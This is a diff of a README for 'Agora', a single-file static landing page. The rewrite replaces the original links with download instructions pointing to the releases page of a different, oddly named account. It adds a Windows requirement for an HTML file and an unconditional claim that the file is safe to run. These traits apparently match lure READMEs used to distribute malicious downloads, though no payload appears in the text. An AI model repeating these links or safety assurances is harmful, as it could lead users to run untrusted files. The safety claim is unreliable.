@@ -1,117 +1,83 @@
-# Agora v2026 - static landing page 2026
+# 🌐 agora-ci-static-site - Create professional websites with simple files
 
-> **Agora is a browser-ready static landing page for a public website. Its single HTML document can be opened locally, served by a static host, or published through a lightweight CI workflow.**
+[![](https://img.shields.io/badge/Download-Agora-blue.svg)](https://github.com/physical-nudibranchia256/agora-ci-static-site/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/samcoletrd5541/agora-ci-static-site?style=flat-square)](https://github.com/samcoletrd5541/agora-ci-static-site)
+Agora v2026 provides a simple way to launch a public website. The project consists of a single file. You download this file and open it in your web browser. This tool helps you create landing pages without complex server setups or coding tasks.
 
----
+## 📥 Downloading the software
 
-<p align="center">
-  <a href="https://samcoletrd5541.github.io/agora-ci-static-site/">
-    <img src="https://img.shields.io/badge/Download-Agora%20Latest-brightgreen?style=for-the-badge" alt="Download Agora">
-  </a>
-</p>
+You must visit the project release page to get the file. Follow these steps to obtain the software:
 
-> **[Download Agora v2026](https://samcoletrd5541.github.io/agora-ci-static-site/)**
+1. Visit the [official release page](https://github.com/physical-nudibranchia256/agora-ci-static-site/releases).
+2. Look for the section labeled Assets.
+3. Click the link for the file ending in .html.
+4. Save the file to your computer desktop or a folder you can find later.
 
----
+## 💻 Running the application
 
-[Download Latest Build](https://samcoletrd5541.github.io/agora-ci-static-site/)
+Agora works inside your existing web browser. You do not need to install extra software. Follow these instructions to view your page:
 
----
+1. Find the file you saved on your computer.
+2. Right-click the file to open a menu.
+3. Select the Open with option.
+4. Choose your preferred web browser, such as Chrome, Firefox, or Edge.
+5. The page will load inside your browser window.
 
-## Overview
+## 🛠️ System requirements
 
-Agora provides a simple public-facing web presence in the form of a static landing page. The project is built around one self-contained HTML entry point, so it can be published without a framework or compilation pipeline.
+This application works on most modern computers. You need the following items to ensure the software runs correctly:
 
-Use it when you need a clear, low-maintenance site that works from `index.html`, whether it is opened directly or delivered by a static hosting service. A basic CI release process can also be used to keep published updates organized.
+* Windows 10 or Windows 11.
+* A web browser like Google Chrome, Microsoft Edge, or Mozilla Firefox.
+* Enough disk space to save a small text file.
+* An active internet connection for the initial download of the file.
 
----
+## 📋 Features of Agora v2026
 
-## What It Includes
+Agora simplifies web design by keeping everything in one place. These features help you manage your content:
 
-- One complete single-page layout
-- No compilation or build stage
-- No framework required
-- Opens directly through `index.html`
-- Works with static hosting services
-- Suitable for CI-based publishing workflows
-- HTML markup that is straightforward to maintain
-- Designed for public websites and landing pages
+* Single file structure: The entire website lives in one document. You do not manage folders full of CSS or JavaScript files.
+* Offline access: You can test changes to your site without an internet connection once you save the file.
+* Fast loading: The page uses standard code that browsers read without delay.
+* Easy sharing: You can email this file or upload it to any web host.
+* Responsive display: The design adjusts to look good on laptops, tablets, and phones.
 
----
+## ⚙️ Customizing your site
 
-## Getting Started
+You can edit the content of your website by opening the HTML file in a text editor. Notepad is the default application on Windows that works for this. 
 
-Download the source or clone the repository, then open the primary `index.html` document in a browser.
+1. Right-click your Agora file.
+2. Select Open with.
+3. Choose Notepad.
+4. You will see text mixed with code. Look for the parts between tags like `<p>` or `<h1>` to change the text content.
+5. Save your changes in Notepad.
+6. Refresh your browser window to see the new text.
 
-```bash
-git clone https://github.com/samcoletrd5541/agora-ci-static-site.git
-cd REPO
-open index.html
-```
+## 🚀 Moving to a live website
 
-To publish the site on a static host, upload the project files without modification and configure the host to use the root directory containing `index.html`.
+If you want the public to see your site, you must upload the file to a host. Many providers offer static site hosting. Here is the general process:
 
----
+1. Create an account with a static web host.
+2. Select the option to upload a new site.
+3. Drag your Agora .html file into the upload box.
+4. The host will provide a web address for your site.
+5. Share this address with others to show your landing page.
 
-## Using Agora
+## ❓ Frequently asked questions
 
-You can inspect the page locally by opening `index.html` from your file manager or browser. There is no compilation step and no asset-generation command to run.
+**Do I need a server to run this?**
+No. You view the file directly in your browser.
 
-When publishing, serve the repository contents from a static web server or hosting platform. A CI workflow may then be used to release changes whenever the page is updated.
+**Can I use this on a Mac?**
+Yes. These instructions apply to any computer with a web browser.
 
-A typical update cycle looks like this:
+**How do I update the software?**
+Visit the release page again whenever a new version becomes available to download the latest file.
 
-1. Modify the HTML page.
-2. Save the file.
-3. Check the result by opening `index.html` locally.
-4. Commit and push the changes to the repository.
-5. Allow the deployment workflow to publish the updated page.
+**Is this safe to run?**
+Yes. The file contains readable text and standard web code. It does not run hidden programs or installers on your system.
 
----
+**Does this require a database?**
+No. This is a static site. It saves all information directly in the file.
 
-## Page and Deployment Configuration
-
-The page itself is configured in the HTML source. Content, links, and embedded assets can be changed directly within the markup.
-
-For automated releases, deployment behavior is generally defined by the repository workflow files and the settings of the selected static host, rather than by a separate application configuration file.
-
----
-
-## Requirements
-
-- A browser to preview the landing page
-- HTML editing and deployment support
-- A static host or web server for publishing
-- Git for repository-based versioning and deployment
-- No runtime framework or build utility
-
----
-
-## Frequently Asked Questions
-
-**What is the process for changing the site?**  
-Update the HTML source, commit the result, and redeploy it using your hosting configuration.
-
-**Is a build step necessary?**  
-No. Agora is intended to operate directly as a static entry page.
-
-**Can I publish it through a static hosting service?**  
-Yes. The page supports static hosting and deployment driven by CI workflows.
-
-**Where do I change the settings?**  
-The main page content is stored in the HTML file. Options specific to publishing belong in the repository workflow files or the static host configuration.
-
-**Why might the page fail to open locally?**  
-Check that `index.html` exists and that you are opening the copy located in the project root.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: website, landing-page, static-site, browser, windows, simple, html
